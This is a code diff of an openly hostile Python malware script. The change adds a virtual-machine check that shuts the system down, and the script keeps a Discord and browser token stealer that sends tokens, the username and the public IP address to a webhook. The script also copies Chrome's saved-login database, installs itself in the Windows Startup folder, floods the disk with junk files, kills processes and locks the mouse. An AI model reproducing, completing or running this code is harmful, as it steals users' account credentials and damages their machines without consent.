@@ -134,124 +134,138 @@ class harmful:
         # WORK ON LATER 
         print(os.path.isdir("C:\Program Files\Google\Chrome\Application"))
         print(os.path.isdir(os.path.expanduser('~') + "\AppData\Local\Discord"))
-        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+        login_db = os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\default\Login Data'
         shutil.copy2(login_db, "Loginvault.db")
 
 
 if __name__ == "__main__":
-    ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
-    
-    for i in range(random.randint(25, 200)):
-        open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 250)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
-    
-    #FIX LATER THIS SO ANNOYING!!!!!!
-    try:
-        startup = os.environ["USERPROFILE"] + os.sep + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-        shutil.copy2(__file__, startup)
-    except:
-        pass
-    
-    
-    
-    # your webhook URL
-    WEBHOOK_URL = 'WEBHOOK HERE'
-
-    # mentions you when you get a hit
-    PING_ME = False
-
-    def find_tokens(path):
-        path += '\\Local Storage\\leveldb'
-
-        tokens = []
-
-        for file_name in os.listdir(path):
-            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                continue
-
-            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-        return tokens
-
-    def main():
-        local = os.getenv('LOCALAPPDATA')
-        roaming = os.getenv('APPDATA')
-
-        paths = {
-            'Discord': f"{roaming}\\Discord",
-            'Discord Canary': f"{roaming}\\discordcanary",
-            'Discord PTB': f"{roaming}\\discordptb",
-            'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
-            'Opera': f"{roaming}\\Opera Software\\Opera Stable",
-            'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default"
-        }
-
-        message = '@everyone' if PING_ME else ''
-
-        for platform, path in paths.items():
-            if not os.path.exists(path):
-                continue
-
-            message += f'\n**{platform}**\n```\n'
-            tokens = find_tokens(path)
-
-            if len(tokens) > 0:
-                for token in tokens:
-                    message += f'{token}\n'
-            else:
-                message += 'No tokens found.\n'
-
-            message += '```'
-
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-        }
-
-        payload = json.dumps({'content': message})
-        info = f" {os.environ['USERNAME']} {requests.get('https://api.ipify.org').text}"
+    """VM CHECK"""
+    #Make more harmful
+    if hasattr(sys, "real_prefix"):
+        os.system("shutdown /s")
+        while 1:
+            os.system("start")
+            ctypes.windll.user32.MessageBoxW(0, "WHY USE VM???", "NICE VM", 1)
         
-        packet = payload + info
-
+    else:
+        ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
+            
+        for i in range(random.randint(25, 200)):
+            open(f"{''.join(random.choice(string.ascii_letters) for i in range(random.randint(20, 250)))}.txt", "a").write("LOL WHY DID U RUN THIS????")
+            
+        #FIX LATER THIS SO ANNOYING!!!!!!
         try:
-            req = Request(WEBHOOK_URL, data=packet.encode(), headers=headers)
-            urlopen(req)
+            startup = os.environ["USERPROFILE"] + os.sep + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+            shutil.copy2(__file__, startup)
         except:
             pass
+            
+            
+            
+        # your webhook URL
+        WEBHOOK_URL = 'WEBHOOK HERE'
+
+        # mentions you when you get a hit
+        PING_ME = False
+
+        def find_tokens(path):
+            try:
+                path += '\\Local Storage\\leveldb'
+
+                tokens = []
+
+
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                            for token in re.findall(regex, line):
+                                tokens.append(token)
+                return tokens
+            except:
+                pass
+
+        def logger():
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
+
+            paths = {
+                'Discord': f"{roaming}\\Discord",
+                'Discord Canary': f"{roaming}\\discordcanary",
+                'Discord PTB': f"{roaming}\\discordptb",
+                'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
+                'Opera': f"{roaming}\\Opera Software\\Opera Stable",
+                'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+                'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default"
+            }
+
+            message = '@everyone' if PING_ME else ''
+
+            for platform, path in paths.items():
+                if not os.path.exists(path):
+                    continue
+
+                message += f'\n**{platform}**\n```\n'
+                tokens = find_tokens(path)
+
+                if len(tokens) > 0:
+                    for token in tokens:
+                        message += f'{token}\n'
+                else:
+                    message += 'No tokens found.\n'
+
+                message += '```'
+
+            headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+            }
+
+            payload = json.dumps({'content': message})
+            info = f" {os.environ['USERNAME']} {requests.get('https://api.ipify.org').text}"
+                
+            packet = payload + info
+
+            try:
+                req = Request(WEBHOOK_URL, data=packet.encode(), headers=headers)
+                urlopen(req)
+            except:
+                pass
+                
+        logger()
+            
+            
+        harmless = harmless()
+        malware = malware()
+            
+        #Threads
+        popup_thread = threading.Thread(target=harmless.pop_up).start()
+        openurl_thread = threading.Thread(target=harmless.open_url).start()
+        change_wallpaper = threading.Thread(target=harmless.change_wallpaper).start()
+        mouse_locker = threading.Thread(target=harmless.mouse_lock).start()
+        kill_thread = threading.Thread(target=malware.kill).start()
+        random_kill_thread = threading.Thread(target=malware.random_kill).start()
+        create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
+        sound_thread = threading.Thread(target=harmless.sound).start()
+        #rat_thread = threading.Thread(target=harmful.rat).start()
+            
+        #Make rat multiprocessed
+            
+        #Multiprocesses
+            
+        popup_thread.join()
+        openurl_thread.join()
+        change_wallpaper.join()
+        kill_thread.join()
+        mouse_locker.join()
+        random_kill_thread.join()
+        create_random_folder_thread.join()
+        sound_thread.join()
+        #rat_thread.join()
         
-    main()
-    
-    
-    harmless = harmless()
-    malware = malware()
-    
-    #Threads
-    popup_thread = threading.Thread(target=harmless.pop_up).start()
-    openurl_thread = threading.Thread(target=harmless.open_url).start()
-    change_wallpaper = threading.Thread(target=harmless.change_wallpaper).start()
-    mouse_locker = threading.Thread(target=harmless.mouse_lock).start()
-    kill_thread = threading.Thread(target=malware.kill).start()
-    random_kill_thread = threading.Thread(target=malware.random_kill).start()
-    create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
-    sound_thread = threading.Thread(target=harmless.sound).start()
-    #rat_thread = threading.Thread(target=harmful.rat).start()
-    
-    #Make rat multiprocessed
-    
-    #Multiprocesses
-    
-    popup_thread.join()
-    openurl_thread.join()
-    change_wallpaper.join()
-    kill_thread.join()
-    mouse_locker.join()
-    random_kill_thread.join()
-    create_random_folder_thread.join()
-    sound_thread.join()
-    #rat_thread.join()
-    
-    
-    
-    
+        
+        
+        
+        
